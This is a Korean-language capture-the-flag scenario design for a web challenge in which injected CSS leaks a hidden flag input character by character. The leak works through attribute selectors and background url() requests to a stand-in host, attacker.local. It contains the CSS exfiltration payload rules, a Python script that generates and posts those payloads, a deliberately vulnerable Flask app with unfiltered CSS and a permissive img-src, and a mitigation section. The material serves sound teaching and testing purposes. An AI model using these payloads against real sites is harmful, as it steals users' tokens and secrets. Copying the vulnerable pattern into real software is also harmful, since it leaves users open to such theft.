---
title: CSS Injection Side-Channel Keylogger — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, css-injection, keylogger, side-channel, csp-bypass]
confidence: high
---

# CSS Injection Side-Channel Keylogger — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Custom Profile Decorator (커스텀 프로필 꾸미기)
- **난이도**: High
- **핵심 컨셉**: 자바스크립트 실행이 강력하게 차단된 콘텐츠 보안 정책(CSP) 환경 하에서, 오직 스타일시트(**CSS Injection**)만을 활용해 중요 기밀 토큰을 훔쳐내는 고급 클라이언트 사이드 취약점 문제입니다. 공격자는 자신의 프로필 페이지에 커스텀 테마 CSS 설정을 주입할 수 있습니다. 피해자(관리자 봇)가 이 페이지를 로드할 때, 브라우저가 제공하는 CSS **속성 선택자(Attribute Selector)** 기능과 외부 이미지 백채널 통신을 엮어 관리자의 자동 완성 토큰 또는 폼에 기입된 비밀번호 데이터를 1바이트씩 공격자 리시버로 유출해 냅니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Profile View**: 
  - 사용자 커스텀 CSS 코드가 `<style>` 태그 또는 동적 스타일 파일 링크로 로드되어 화면을 렌더링함.
  - 해당 화면에는 민감한 중요 토큰값(예: 관리자의 CSRF 토큰 또는 플래그가 값으로 정의된 input 태그)이 렌더링되어 감춰져 있음.
- **Backend Service (Python/Flask or Node.js)**:
  - 사용자별 프로필 설정 저장 및 출력 기능.
  - 엄격한 CSP 정책을 헤더로 제공: `Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src http://attacker.local; script-src 'none';` (즉, 자바스크립트는 전혀 동작하지 않는 순수 HTML/CSS 렌더링 환경).
- **Flag 위치**: 
  - 관리자 봇이 공격자의 프로필을 열 때 브라우저 폼에 담겨 있는 비밀 플래그 input 태그의 `value` 값: `<input id="flag" value="FLAG_XYZ..." />`

### 2.2 취약점 지점
1. **Unfiltered CSS Injection**:
   - 커스텀 CSS 코드를 사용자에게 직접 입력받아 렌더링하며, CSS 내부에 쓰이는 특수 지시어(`url()`, `[attribute^=...]`)의 위험성을 간과하여 별도의 필터나 이스케이프 처리를 적용하지 않았습니다.
2. **Side-channel Leak via Attribute Selector**:
   - CSS 선택자는 특정 조건이 성립될 때 배경 이미지 주소(`background: url(...)`)를 동적으로 로드하게 설계될 수 있습니다. 이를 문자열 시작 비교 선택자(`^=`)와 결합하면 특정 문자로 시작할 때마다 공격자 주소로 HTTP 요청이 날아가도록 트리거할 수 있습니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 / 파라미터 | 메소드 | 인증 | 입력 값 | 반환 값 | 비고 |
|---------------------|--------|------|---------|---------|------|
| `/profile/edit` | POST | 없음 | `{"css_payload": "..."}`| 저장 성공 결과 | CSS 주입 지점 |
| `/profile/view/admin`| GET | 어드민 로그인 | 없음 | 어드민 프로필 화면 | 관리자 봇이 접속하여 유출을 일으키는 타켓 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 주입 상태 및 타겟 엘리먼트 관찰
1. 프로필 편집 창에 스타일을 넣어 HTML에 반영되는지 봅니다.
   - *입력*: `body { background-color: red; }`  
   - *결과*: 프로필 화면의 배경이 빨갛게 변하는 것을 확인 (CSS 주입 가능 확인).
2. 관리자 봇이 이 페이지를 조회할 때 화면 내부 구조를 유추해 봅니다.
   어드민의 기밀 세팅창 또는 프로필 뷰어 하단에는 숨겨진 플래그 인풋 태그가 존재합니다:
   `<input type="password" id="secret_flag" value="FLAG{css_...}">`

### Step 2. CSS 속성 선택자 페이로드 설계
속성 선택자 `input[value^="a"]`는 input 태그의 `value` 속성이 문자 `a`로 시작할 때 해당 스타일을 적용시킵니다.
- **문자 판별용 CSS 규칙**:
  ```css
  /* value가 'F'로 시작하면 공격자 수신 서버로 이미지 요청 전송 */
  input[id="secret_flag"][value^="F"] { background: url("http://attacker.local/leak?char=F"); }
  input[id="secret_flag"][value^="FL"] { background: url("http://attacker.local/leak?char=FL"); }
  input[id="secret_flag"][value^="FLA"] { background: url("http://attacker.local/leak?char=FLA"); }
  ```
  이러한 방식을 결합하여 모든 아스키 문자 후보군에 대해 규칙을 매핑합니다.

### Step 3. 순차적 브루트포스 덤프 시퀀스 수행
관리자 봇은 한 번 페이로드가 담긴 페이지를 로드할 때 한 글자를 송출합니다. 글자가 확인되면 공격자는 다음 바이트 판별을 위해 새로운 CSS를 저장하고 봇이 재조회하도록 반복 유도하거나, 여러 속성 매치를 병렬로 주입해 실시간 유출 트리거를 만듭니다.
- *공격자 수신 리포터 스크립트 작성 (Python)*:
  ```python
  # 실시간으로 수신된 문자를 기반으로 다음 자리에 대한 CSS 페이로드를 생성해 
  # 프로필을 업데이트 시키고 봇 조회를 재트리거하는 오토 로더 예시
  import requests
  
  known_flag = "FLAG{"
  chars = "abcdefghijklmnopqrstuvwxyz0123456789_}"
  
  # 다음 문자 판별을 위한 CSS 생성
  css_payload = ""
  for c in chars:
      next_test = known_flag + c
      css_payload += f'input[id="secret_flag"][value^="{next_test}"] {{ background: url("http://attacker.local/leak?char={c}"); }}\n'
  
  # CSS 저장 API 호출
  requests.post("http://profile.challenge.local/profile/edit", data={"css": css_payload})
  ```

### Step 4. flag 획득
관리자 봇이 공격자의 프로필을 열 때마다, 브라우저는 어드민의 `secret_flag` 인풋에 설정된 밸류 값을 CSS 엔진으로 분석합니다. 문자 조합이 매칭되는 스타일 규칙의 `url()` 지시어가 실행되어, 공격자의 리시버 로그에 순차적으로 문자열 조각이 남게 되고, 최종 결합으로 플래그(`FLAG{css_injection_sidechannel_exfiltration}`)를 취득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python Flask)

```python
# app.py
from flask import Flask, request, render_template_string, make_response

app = Flask(__name__)

# 임시 메모리 저장소
user_styles = {
    "attacker": "body { background: #fafafa; }"
}

@app.route("/profile/edit", methods=["POST"])
def edit_style():
    # 취약점 지점: CSS 내용에 대한 필터링이나 클렌징 처리 누락
    css_payload = request.form.get("css", "")
    user_styles["attacker"] = css_payload
    return "Theme updated!"

@app.route("/profile/view/<username>")
def view_profile(username):
    # 테마 설정 렌더링
    theme_css = user_styles.get(username, "")
    
    # 챌린지 상에 인젝션용 기밀 토큰을 밸류로 가지는 인풋 태그 노출
    # 관리자 로그인일 때만 이 값이 실려 있다고 가정
    secret_value = "FLAG{css_injection_sidechannel_exfiltration}"
    
    html = f"""
    <html>
    <head>
        <title>{username}'s Profile</title>
        <style>
            /* 공격자가 주입한 CSS 구문이 날것 그대로 인쇄됨 */
            {theme_css}
        </style>
    </head>
    <body>
        <h1>Welcome to {username}'s space</h1>
        <div id="content">This is a custom space.</div>
        
        <!-- 보안상 감추어둔 중요 관리자 입력 폼 -->
        <input type="password" id="secret_flag" value="{secret_value}" />
    </body>
    </html>
    """
    
    response = make_response(render_template_string(html))
    
    # 강력한 CSP 적용: 자바스크립트는 차단되었으나 unsafe-inline style 및 외부 이미지 도메인은 허용
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "style-src 'self' 'unsafe-inline'; "
        "img-src *; " # 외부 리시버 IP로 연결 허용
        "script-src 'none';"
    )
    return response

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **사용자 직접 CSS 코딩 제한 (No Raw CSS)**:
   - 사용자가 날것의 CSS 텍스트를 구성하게 두지 마십시오. 대신 테마 색상 코드, 배경 이미지 URL 링크 등만 입력받아 미리 선언된 안전한 스타일 매핑 구조에 바인딩하여 렌더링합니다.
2. **CSP 이미지 외부 전송 차단 (Tight Content Security Policy)**:
   - 콘텐츠 보안 정책 설정에서 `img-src` 지시자를 신뢰할 수 없는 임의 외부 주소(`*`)로 지정하지 않고, 반드시 오리진 도메인 `'self'` 또는 허용된 CDN 도메인으로만 제한하여 스타일시트 내 `url()`을 통한 아웃오브밴드 정보 유출 경로를 차단합니다.
3. **CSS 정화 도구 도입**:
   - 외부 스타일 적용이 필요한 경우 CSSTidy 또는 이스케이프 라이브러리를 통과시켜 `url` 및 속성 선택자 구문을 포함하는 구문을 필터링하여 드롭시킵니다.
